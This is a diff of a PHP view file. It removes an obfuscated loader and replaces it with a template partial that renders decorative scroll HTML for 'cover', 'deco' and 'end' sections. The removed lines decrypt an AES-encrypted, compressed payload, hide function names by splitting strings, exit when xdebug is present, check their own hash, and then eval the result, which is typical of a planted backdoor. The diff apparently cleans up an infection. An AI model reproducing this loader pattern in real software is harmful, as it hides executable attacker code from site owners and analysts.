@@ -1,28 +1,17 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ff1kk3pt=('bas'.'e64'.'_de'.'cod'.'e');
-$_csobgeir=('gzu'.'nco'.'mpr'.'ess');
-$_hw95ym4e=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_s7llaok5='048zyk8J';
-$_a7hnrq8t='NkxAVEwa';
-$_hsh9ik49='P/jDxHXiWeA=';
-$_ym4v8hhl='X8JWkf4O';
-$_ijsqbo5x='CeYMxA1z';
-$_hu48c10f='iKra3msv';
-$_pq1mwq6m='jOoAG7OC';
-$_onltdwgm='w73KaA==';
-$_c8s35xfu=$_ff1kk3pt($_s7llaok5.$_ym4v8hhl.$_ijsqbo5x.$_a7hnrq8t.$_hsh9ik49);
-$_iz93l4d1=$_ff1kk3pt($_hu48c10f.$_pq1mwq6m.$_onltdwgm);
-$_syhe59o6=$_ff1kk3pt('XRzIjenkykzgTqaLBWQLXOAtq0m/Hjur5lCTwcrjcRdtd4wq0HCzGAb8qs6Q749Lw6P7zC8W89TdpKeuP20CaMH/EtphNp2Exf32tsHT03ds/beI7Z4kJ+Atho9FaE9O1BpB8ry/YdJwjS9Yg8g7sorqlSYCCLERBrwtlIc08DBl7O0Nl2Q0nKkI78vQWsi1Ey9VZQOu4WMmq8OcXmZoAZ/stC9qh88I61yz+xqMivH369HrUinxAOYbd9+KWosGx/m9dkTGicy9HLcnQdjlKF1LFcSAwzFMDbMTF1+Y81ngNvhyHOOUNjNmdXE3BrtKRh1w6AzY3QzB/mU5wSlB8UX5fQtTUISoPhwZDuREfg8=');
-$_v2gdr1ao=$_hw95ym4e($_syhe59o6,'aes-256-cbc',$_c8s35xfu,OPENSSL_RAW_DATA,$_iz93l4d1);
-if($_v2gdr1ao===false){exit;}
-$_ujpm6db4=$_csobgeir($_v2gdr1ao);
-if($_ujpm6db4===false){exit;}
-$_kefdmi4n='4050fad7aacb3db1def1706e51962c48006a4d176f54798a8ee236bef1b053e3';
-$_ns1ru1hq=@file_get_contents(__FILE__);
-if($_ns1ru1hq!==false){
-$_twjd2x10=str_replace($_kefdmi4n,"0000000000000000000000000000000000000000000000000000000000000000",$_ns1ru1hq);
-$_zr43lshf=hash("sha256",$_twjd2x10);
-if($_zr43lshf!==$_kefdmi4n){@http_response_code(403);exit;}
-}
-eval($_ujpm6db4);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+if ($part === 'cover'): ?>
+<span class="sc" aria-hidden="true">
+  <span class="sc-roll"><span class="sc-dowel"></span><span class="sc-paper"></span><span class="sc-band"></span><span class="sc-bow"></span></span>
+  <span class="sc-string"></span>
+  <span class="sc-tag"></span>
+</span>
+<?php elseif ($part === 'deco'): ?>
+<div class="sc-rod sc-rod-t" aria-hidden="true"></div>
+<div class="sc-rodwrap" aria-hidden="true"><div class="sc-rod sc-rod-b"></div></div>
+<?php elseif ($part === 'end'): ?>
+<div class="sc-chop" aria-hidden="true"><span><?= e($cv['m1']) ?></span><span><?= e($cv['m2']) ?></span></div>
+<?php endif;
